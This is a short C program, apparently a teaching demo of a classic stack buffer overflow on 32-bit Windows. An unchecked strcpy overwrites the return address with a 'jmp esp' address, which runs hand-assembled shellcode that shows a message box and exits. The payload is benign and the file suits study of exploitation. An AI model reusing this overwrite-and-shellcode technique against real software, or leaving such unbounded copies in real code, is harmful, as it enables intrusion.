#include "windows.h"
#include "stdio.h"
#include "string.h"

char name[] =	"\x41\x41\x41\x41\x41\x41\x41\x41"	// name[0]~name[7]
				"\x41\x41\x41\x41"					//ebp
				"\x79\x5b\xe3\x77"					//return address	jmp esp
				"\x83\xEC\x50"						//sub esp,50h
				"\x33\xDB"							//xor ebx,ebx
				"\x53"								//push ebx  也就是push 0
				"\x68\x69\x6E\x67\x20"				//字符串
				"\x68\x57\x61\x72\x6E"
				"\x8B\xC4"
				"\x53"								//push ebx  也就是push 0
				"\x68\x75\x66\x65\x69"				//字符串
				"\x68\x62\x79\x20\x6C"
				"\x8B\xCC"							//mov eax,esp
				"\x53"								//push ebx
				"\x50"								//push eax
				"\x51"								//push ecx
				"\x53"								//push ebx
				"\xB8\xEA\x07\xD5\x77"				//mov eax,0x77d507ea
				"\xFF\xD0"							//call eax   				//call MessageBox
				"\x53"								//push ebx  也就是push 0
				"\xB8\xA2\xBF\x81\x7C"				//mov eax,0x7c81cafa
				"\xFF\xD0";							//call eax					//call ExitPorecess

int main()
{
	char buffer[8];
	LoadLibrary("user32.dll");
	strcpy(buffer, name);
	printf("%s\n",buffer);
	getchar();
	return 0;
}
